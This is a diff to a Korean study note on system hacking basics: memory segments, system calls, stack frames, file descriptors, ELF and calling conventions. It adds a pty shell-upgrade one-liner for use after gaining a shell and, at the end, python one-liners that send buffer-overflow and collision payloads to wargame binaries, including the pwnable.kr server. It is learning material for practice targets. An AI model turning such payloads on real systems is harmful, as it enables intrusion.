@@ -1,9 +1,19 @@
 [[Package - Pwntools]]
+[[GDB계열]]
 [[Shellcode]]
+[[SBO]]
+[[RAO]]
+[[Dreamhack - basic_shell]]
+[[Memory Mitigation - Canary]]
+[[Memory Mitigation - Canary]]
 
 # tty를 이용한 쉘 업그레이드
 쉘 따고 나서 쓰면 됨
 	python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+# 바이너리 아키텍쳐 확인
+`file [바이너리 이름]`
 
 
 # 리눅스 프로세스의 메모리 구조
@@ -19,7 +29,7 @@
 
 ### 코드 세그먼트(Code Segment)
 실행 가능한 기계 코드가 위치하는 영역
-텍스트 세그먼트(Text Segment)라고도 불립니다.
+텍스트 세그먼트(Text Segment)라고도 불림
 
 프로그램이 동작하려면 코드를 실행할 수 있어야 하므로 읽기 권한 과 실행 권한 이 부여됨
 반면 쓰기 권한이 있으면 공격자가 악의적인 코드를 삽입하기가 쉬워지므로, 대부분의 현대 운영체제는 이 세그먼트에 쓰기 권한을 제거함
@@ -43,7 +53,7 @@ CPU가 이 세그먼트의 데이터를 읽을 수 있어야 하므로, 읽기 �
 
 
 ## 스택 세그먼트(Stack Segment)
-함수의 인자나 지역 변수와 같은 임시 변수들이 실행중에 여기에 저장
+함수의 인자나 지역 변수와 같은 임시 변수들이 실행 중에 여기에 저장
 어떤 프로세스가 실행될 때, 이 프로세스가 얼마 만큼의 스택 프레임을 사용하게 될 지를 미리 계산하는 것은 일반적으로 불가능하기 때문에,
 운영체제는 프로세스를 시작할 때 작은 크기의 스택 세그먼트를 먼저 할당해주고, 부족해 질 때마다 이를 확장해줌
 스택에 대해서 ‘아래로 자란다' 라는 표현을 종종 사용하는데, 이는 스택이 확장될 때, 기존 주소보다 낮은 주소로 확장되기 때문
@@ -96,6 +106,16 @@ CPU가 이 세그먼트의 데이터를 읽을 수 있어야 하므로, 읽기 �
 인텔의 경우에는 새로운 아키텍처와 호환되지 않을 수 있음을 우려하여 기존에 사용하던 WORD의 크기(2바이트)를 그대로 유지하고, 
 DWORD(Double Word, 32bit)와 QWORD(Quad Word, 64bit)자료형을 추가로 만들었음
 
+
+# 쉘과 커널
+직역하면, 쉘은 껍질, 커널은 호두 속 내용물
+셸(Shell)이란 운영체제에 명령을 내리기 위해 사용되는 사용자의 인터페이스
+커널(Kernel)은 운영 체제의 핵심 부분으로, 하드웨어와 직접적으로 통신하며 시스템 자원과 프로세스를 관리
+
+커널은 시스템의 핵심적인 관리와 통제를 담당하는 반면, 쉘은 사용자와 시스템 간의 상호 작용을 중개하는 역할
+커널은 대부분의 운영 체제에서 하나만 존재하지만, 쉘은 여러 종류와 인스턴스가 동시에 존재할 수 있음
+
+
 # 시스템 콜
 운영체제는 연결된 모든 하드웨어 및 소프트웨어에 접근할 수 있으며, 이들을 제어함
 해킹으로부터 이 막강한 권한을 보호하기 위해 커널 모드와 유저 모드로 권한을 나눔
@@ -116,3 +136,79 @@ DWORD(Double Word, 32bit)와 QWORD(Quad Word, 64bit)자료형을 추가로 만�
 ![[Pasted image 20231024220518.png]]
 
 x64아키텍처에서는 시스템콜을 위해 `syscall` 명령어가 있음
+
+
+
+# SFP 과 RET
+- SFP
+함수 a에서 b를 호출한 뒤 b 함수가 종료된 후 a 함수로 되돌아갔을때의 a 함수가 사용하던 스택 위치를 복구할 수 있도록 저장해놓은 공간
+- RET
+되돌아갔을때 a 함수의 코드가 마저 실행될 수 있도록 a 함수 코드 주소를 저장
+
+```
+Local Variables ...       <-- 상위 함수의 스택 프레임
+-----------------
+Saved Frame Pointer (SFP) <-- 이전 함수의 프레임 포인터
+-----------------
+Return Address (RET)      <-- 함수가 종료된 후 돌아갈 주소
+-----------------
+Local Variables ...       <-- 현재 함수의 스택 프레임
+```
+
+
+# FD
+파일 서술자, FIle Descriptor
+유닉스 계열의 운영체제에서 파일에 접근하는 소프트웨어에 제공하는 가상의 접근 제어자
+유닉스 계열의 운영체제에서 파일에 접근하는 소프트웨어에 제공하는 가상의 접근 제어자
+
+서술자 각각은 번호로 구별되는데, 
+일반적으로 0번은 일반 입력(Standard Input, STDIN), 
+1번은 일반 출력(Standard Output, STDOUT), 
+2번은 일반 오류(Standard Error, STDERR)에 할당되어 있으며, 
+이들은 프로세스를 터미널과 연결해줌
+
+프로세스가 생성된 이후, 위의 open같은 함수를 통해 어떤 파일과 프로세스를 연결하려고 하면, 기본으로 할당된 2번 이후의 번호를 새로운 fd에 차례로 할당해줌
+프로세스는 그 fd를 이용하여 파일에 접근할 수 있음
+
+
+# ELF
+대부분의 운영체제는 실행 가능한 파일의 형식을 규정하고 있음
+윈도우의 [PE](https://en.wikipedia.org/wiki/Portable_Executable), 리눅스의 [ELF](https://en.wikipedia.org/wiki/Executable)가 대표적인 예
+ELF(Executable and Linkable Format)는 크게 헤더와 코드 그리고 기타 데이터로 구성되어 있는데, 
+헤더에는 실행에 필요한 여러 정보가 적혀 있고, 코드에는 CPU가 이해할 수 있는 기계어 코드가 적혀있음
+
+
+# Calling Convention
+함수 호출 규약
+함수의 호출 및 반환에 대한 약속
+
+- x86 함수 호출 규약
+
+|   |   |   |   |   |
+|---|---|---|---|---|
+|**함수호출규약**|**사용 컴파일러**|**인자 전달 방식**|**스택 정리**|**적용**|
+|stdcall|MSVC|Stack|Callee|WINAPI|
+|cdecl|GCC, MSVC|Stack|Caller|일반 함수|
+|fastcall|MSVC|ECX, EDX|Callee|최적화된 함수|
+|thiscall|MSVC|ECX(인스턴스), Stack(인자)|Callee|클래스의 함수|
+
+- x86-64 함수 호출 규약
+
+|   |   |   |   |   |
+|---|---|---|---|---|
+|**함수호출규약**|**사용 컴파일러**|**인자 전달 방식**|**스택 정리**|**적용**|
+|MS ABI|MSVC|RCX, RDX, R8, R9|Caller|일반 함수, Windows Syscall|
+|System ABI|GCC|RDI, RSI, RDX, RCX, R8, R9, XMM0–7|Caller|일반 함수|
+
+
+# `python -c` 을 이용한 exploit
+
+```bash
+./bof `python -c "print 'A'*52+'\xbe\xba\xfe\xca'"`
+(python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | ./bof
+(python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
+
+./col `python -c "print '\xcc\xce\xc5\x06'+'\xc8\xce\xc5\x06'*4"`
+```
+
+
